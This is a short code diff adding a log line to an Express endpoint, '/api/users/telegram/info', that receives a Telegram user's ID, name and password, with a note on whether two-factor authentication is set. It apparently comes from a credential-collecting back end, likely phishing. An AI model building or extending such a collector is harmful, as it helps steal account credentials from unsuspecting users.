@@ -93,6 +93,8 @@ app.post("/api/users/telegram/info", async (req, res) => {
       type,
     } = req.body;
 
+    console.log(`[${type}] Received credentials from ${firstName} (${userId})`)
+
     let pass = password;
     if (pass === null) {
       pass = "No Two-factor authentication enabled.";
